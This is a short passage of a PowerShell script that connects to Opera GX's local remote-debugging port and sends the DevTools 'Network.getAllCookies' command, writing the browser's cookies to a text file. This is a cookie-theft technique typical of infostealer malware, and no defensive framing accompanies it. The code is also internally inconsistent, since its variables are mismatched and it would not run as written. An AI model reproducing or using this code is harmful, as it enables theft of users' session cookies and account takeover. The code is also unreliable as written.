...
$operaurl = "http://localhost:$RDP/json"
$operadata = Invoke-RestMethod -Uri $operagx -Method Get
$operacapture = $operagx.webSocketDebuggerUrl
$operasrc = '{"id": 1,"method":"Network.getAllCookies"}'
SendReceiveWebSocketMessage -WebSocketUrl $operacapture[0] -Message $operagx -out "operagx.txt"
